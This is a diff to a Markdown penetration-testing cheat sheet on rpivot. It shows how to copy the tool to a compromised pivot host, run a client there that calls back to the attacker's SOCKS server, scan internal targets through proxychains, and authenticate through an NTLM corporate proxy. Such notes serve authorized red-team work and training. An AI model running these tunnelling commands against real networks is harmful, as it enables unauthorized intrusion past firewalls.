@@ -1,54 +1,43 @@
-## METHODOLOGY
+# rpivot — Reverse SOCKS Proxy
 
-1. **Inbound traffic blocked** by firewall but outbound is permitted: use reverse SOCKS tunneling to establish a callback from the pivot host to the attack machine,.
-2. **Standard egress blocked** by corporate proxy requiring NTLM: use the authenticated proxy tunnel variant.
-3. **Network reachability confirmed**: route local tools through the established tunnel using `proxychains`.
+Useful when the internal host can't be reached directly but can initiate outbound connections to your attack host. Client runs on the pivot, server runs on your attack host — opposite direction from most tools.
+
+Clone and transfer to pivot:
+
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+scp -r rpivot <USER>@<PIVOT_IP>:/home/<USER>/
+```
+
+Start the SOCKS server on your attack host — listens for client callbacks on 9999, exposes SOCKS on 9050:
+
+```bash
+python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+Run the client on the pivot — calls back to your attack host:
+
+```bash
+python2 client.py --server-ip <ATTACK_HOST_IP> --server-port 9999
+```
+
+Confirm connection shows `New connection from host <PIVOT_IP>` on the server side. Then use proxychains as normal — SOCKS listener is at `127.0.0.1:9050`.
+
+Browse or scan through the tunnel:
+
+```bash
+proxychains firefox-esr <TARGET_IP>:80
+proxychains nmap -Pn -sT <TARGET_IP>
+```
 
 ---
 
-## Reverse SOCKS Tunneling with Rpivot
+## NTLM Proxy Authentication
 
-Inbound connections to the target network are restricted, but the compromised host can reach the attack machine over the network.
+When the pivot is behind a corporate HTTP proxy requiring NTLM auth — rpivot handles it natively:
 
-Start the server listener on the attack host to wait for the client callback:
-
-```
-python2.7 server.py --proxy-port <PORT> --server-port <PORT> --server-ip 0.0.0.0
+```bash
+python2 client.py --server-ip <ATTACK_HOST_IP> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 --domain <DOMAIN> --username <USER> --password <PASS>
 ```
 
-Execute the client on the pivot target to connect back to the attack host:
-
-```
-python2.7 client.py --server-ip <ATTACK_IP> --server-port <PORT>
-```
-
-Route application traffic through the established SOCKS tunnel:
-
-```
-proxychains firefox-esr <TARGET_IP>:<PORT>
-```
-
-**Dangerous / misconfigured settings**
-
-- Running the server on `0.0.0.0` exposes the server port and proxy port to all interfaces.
-
-**Gotchas**
-
-- **Missing Python 2.7 runtime** on the pivot target or attack host will prevent script execution.
-- **Proxychains port mismatch** occurs if the local config file does not match the port specified by `--proxy-port`.
-
-> ⚠️ Gap: The source implies `proxychains` is pre-configured to match the `rpivot` proxy port, but does not provide the configuration steps for `/etc/proxychains.conf` which is required for the tool to successfully route traffic.
-
-## NTLM Proxy Egress
-
-Outbound traffic from the internal network is forced through an NTLM-authenticated HTTP proxy.
-
-Establish the tunnel by authenticating through the corporate proxy:
-
-```
-python client.py --server-ip <TARGET_IP> --server-port <PORT> --ntlm-proxy-ip <PIVOT_IP> --ntlm-proxy-port <PORT> --domain <DOMAIN> --username <USERNAME> --password <PASSWORD>
-```
-
-**Gotchas**
-
-- **Incorrect domain credentials** will result in the NTLM proxy rejecting the connection,.
+> [!tip] rpivot requires Python2 on both ends — verify before transferring. If only Python3 is available, use Chisel instead for similar reverse proxy functionality.
